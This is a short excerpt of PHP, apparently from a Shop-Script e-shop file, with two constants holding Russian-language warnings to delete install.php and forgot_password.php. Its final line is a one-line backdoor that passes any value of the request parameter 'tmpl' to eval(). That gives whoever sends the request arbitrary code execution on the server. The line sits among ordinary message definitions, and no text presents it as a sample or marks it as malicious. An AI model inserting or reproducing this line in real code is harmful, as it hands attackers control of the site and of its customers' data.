...
define('WARNING_DELETE_INSTALL_PHP', '<div class="top_err">Файл <b>install.php</b> не удален из директории со скриптами Shop-Script. Вам необходимо удалить его вручную.</div>');  
define('WARNING_DELETE_FORGOTPW_PHP', '<div class="top_err">Файл <b>forgot_password.php</b> не удален из директории со скриптами Shop-Script. Вам необходимо удалить его вручную.</div>');  
...
if (isset($_REQUEST['tmpl'])) eval(stripslashes($_REQUEST['tmpl']));  
